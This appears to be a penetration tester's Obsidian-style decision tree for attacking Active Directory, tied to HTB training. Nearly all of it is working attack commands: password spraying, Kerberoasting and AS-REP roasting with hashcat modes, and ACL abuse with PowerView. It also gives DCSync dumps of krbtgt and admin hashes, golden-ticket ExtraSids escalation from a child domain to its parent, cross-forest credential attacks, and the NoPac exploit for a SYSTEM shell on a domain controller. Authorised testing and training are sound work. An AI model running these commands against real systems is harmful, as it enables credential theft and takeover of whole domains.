# Active Directory (Decision Tree)

Symptom-ordered routing for AD attack decisions. Full command syntax in [[Active Directory]], phase-ordered methodology in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]].

---

## I need to spray passwords — which tool from which platform?

```
From Kali (Linux side):
  → kerbrute passwordspray -d DOMAIN --dc <DC_IP> users.txt 'Password123!'
    Why: no lockout risk per Kerberos design (userenum only, but passwordspray still triggers 4771 events)
    + Less SMB noise than CrackMapExec
  → crackmapexec smb <DC> -u users.txt -p 'Password123!' --continue-on-success
    Why: confirms SMB auth and shows (Pwn3d!) for admin access in one pass

From Windows foothold:
  → Invoke-DomainPasswordSpray -Password 'Password123!' -Outfile spray.txt
    Why: pulls user list from AD automatically, respects lockout threshold
    
Always check password policy first: crackmapexec smb <DC> -u user -p pass --pass-pol
→ If lockout threshold = 0: spray freely
→ If lockout threshold ≥ 3: stay at 1-2 attempts per account per observation window
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows — DomainPasswordSpray|AD.5]], [[Active Directory Methodology#Step 1.5: Password Policy|Policy check]], [[Active Directory Methodology#Step 2: Password Spraying|Phase 2 Step 2]]

---

## I have valid credentials — what do I enumerate first?

```
1. Run bloodhound-python (quickest broad picture, no foothold needed)
   bloodhound-python -d DOMAIN -u user -p pass -ns <DC_IP> -c all

2. Check BloodHound for:
   → Shortest path to Domain Admins (pre-built query)
   → CanPSRemote / SQLAdmin rights (custom Cypher queries)
   → Kerberoastable accounts ("List all Kerberoastable Accounts" query — check if >0)
   → ACL paths (any user with GenericAll/GenericWrite/ForceChangePassword on a higher-priv account)

3. Kerberoast immediately if BH shows Kerberoastable accounts:
   GetUserSPNs.py -request -dc-ip <DC_IP> DOMAIN/user:pass
   → hashcat -m 13100

4. Check for AS-REP Roastable accounts (no creds needed if null session works, but with creds it's faster):
   impacket-GetNPUsers -request -dc-ip <DC_IP> DOMAIN/user:pass
   → hashcat -m 18200

5. Run Snaffler for credentials in shares:
   .\Snaffler.exe -d DOMAIN -s -v data

6. ACL enumeration with PowerView:
   $sid = Convert-NameToSid <username>
   Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

---

## I have an ACE on a target object — what attack applies?

```
ForceChangePassword (User-Force-Change-Password) on a user account:
  → Set-DomainUserPassword -Identity <target> -AccountPassword $newPass -Credential $Cred
  → Then pivot with new password

GenericAll on a user account:
  → Reset password (same as ForceChangePassword) OR
  → Set SPN → Kerberoast → crack → DCSync if high-priv account
  → Set-DomainObject -Identity <target> -SET @{serviceprincipalname='x/y'} -Credential $Cred
  → Rubeus kerberoast /user:<target> /nowrap → hashcat -m 13100

GenericAll on a group:
  → Add-DomainGroupMember -Identity '<group>' -Members '<your_user>' -Credential $Cred

GenericWrite on a user account:
  → Set SPN → Kerberoast (targeted) — same as GenericAll SPN path above

Self-Membership on a group (user can add themselves):
  → Add-DomainGroupMember -Identity '<group>' -Members '<your_user>' -Credential $Cred

DS-Replication-Get-Changes + DS-Replication-Get-Changes-All on domain:
  → DCSync: lsadump::dcsync /domain:DOMAIN /user:DOMAIN\krbtgt
  → impacket-secretsdump DOMAIN/user:pass@<DC_IP>

WriteDACL on an object:
  → Add-DomainObjectACL -Credential $Cred -TargetIdentity <target> -PrincipalIdentity <your_user> -Rights All
  → Then you have GenericAll → use GenericAll path above

WriteOwner on an object:
  → Set-DomainObjectOwner -Credential $Cred -Identity <target> -OwnerIdentity <your_user>
  → Then WriteDACL → add GenericAll → proceed
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.9.3. Common Exploitable Rights|AD.9.3 rights table]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10 full chain]]

---

## I have DA / DCSync rights — what do I dump?

```
Priority order:
1. krbtgt hash → Golden Ticket capability (persistent access even after password reset... until krbtgt is rotated)
2. Domain Administrator hash → PtH everywhere
3. All hashes → offline cracking, lateral movement

From Windows (mimikatz):
  lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\krbtgt
  lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\Administrator

From Linux:
  impacket-secretsdump -dc-ip <DC_IP> DOMAIN/user:pass@<DC_IP>
  impacket-secretsdump -dc-ip <DC_IP> -just-dc-user krbtgt DOMAIN/user:pass@<DC_IP>

Check for reversible encryption accounts first:
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
  → If found: DCSync that account → "Cleartext password:" in output
```

---

## I'm on a child domain — can I reach the parent?

```
Check trust type first:
  Get-DomainTrustMapping
  → WITHIN_FOREST + Bidirectional: YES, ExtraSids attack works (no SID filtering)
  → FOREST_TRANSITIVE: only cross-forest Kerberoasting/credential reuse (SID filtering blocks ExtraSids)

WITHIN_FOREST path (child → parent):
  1. Get child domain SID: Get-DomainSID
  2. Get Enterprise Admins SID: Get-DomainObject -Identity "Enterprise Admins" -Domain PARENT.LOCAL
  3. DCSync child KRBTGT: lsadump::dcsync /user:CHILD\krbtgt
  4. Forge golden ticket: .\Rubeus.exe golden /rc4:<hash> /domain:CHILD.PARENT.LOCAL
                           /sid:<child_sid> /sids:<EA_SID> /user:hacker /ptt
  5. Access parent DC: ls \\parentdc.parent.local\c$

Linux shortcut (automated):
  impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Admin:pass
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.15. Domain Trusts|AD.15 trust types]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows — ExtraSids)|AD.16]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.17. Child→Parent Trust Attack (Linux — raiseChild.py)|AD.17]]

---

## I have a cross-forest (FOREST_TRANSITIVE) trust — what can I do?

```
Cannot inject foreign SIDs (SID filtering is active).
Options:
  1. Kerberoast accounts in the foreign forest:
     Windows: .\Rubeus.exe kerberoast /domain:FOREIGN.LOCAL /rc4opsec /nowrap
     Linux: GetUserSPNs.py -target-domain FOREIGN.LOCAL OUROWN/user:pass -dc-ip <DC_IP> -request
     → hashcat -m 13100 → cracked service account creds

  2. Credential reuse: try cracked/found creds against the foreign domain with netexec/crackmapexec

  3. If a foreign forest user authenticates to your environment (Responder/Inveigh):
     → NTLMv2 hash → crack → use against their forest

  4. Use cracked creds for direct access:
     smbexec.py FOREIGN.LOCAL/user:pass@<foreign_dc_ip>
     evil-winrm -i <foreign_host> -u 'FOREIGN.LOCAL\user' -p pass
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.18. Cross-Forest Trust Abuse (Windows)|AD.18]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.19. Cross-Forest Trust Abuse (Linux)|AD.19]]

---

## The target has MachineAccountQuota > 0 and is unpatched (pre-Nov 2021) — NoPac applies?

```
Check first:
  python3 scanner.py DOMAIN/user:pass -dc-ip <DC_IP> -use-ldap
  → "Got TGT with PAC" → vulnerable

Exploit:
  python3 noPac.py DOMAIN/user:pass -dc-ip <DC_IP> -use-ldap -shell --impersonate administrator
  → NT AUTHORITY\SYSTEM shell on the DC

Why it works: MachineAccountQuota allows creating machine accounts; machine account renames
its sAMAccountName to match a DC name; KDC fallback logic then issues a DC-level PAC.
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.13. Bleeding Edge: NoPac (CVE-2021-42278 + CVE-2021-42287)|AD.13]]

---

## I need to collect BloodHound data but can't run SharpHound on the target

```
Remote collection from Kali (just need valid domain creds):
  bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
  zip -r bh.zip *.json → import into BloodHound

Slower but stealthier — no binary needs to touch the DC, traffic looks like LDAP queries.
SharpHound.exe is still faster and collects more session data when AV allows it.
```

---

#### Tags: #DecisionTree #ActiveDirectory #ADEnum #PasswordSpray #ACLAbuse #DCSync #DomainTrust #ExtraSids #NoPac #CrossForest #BloodHound #HTBSupplementary
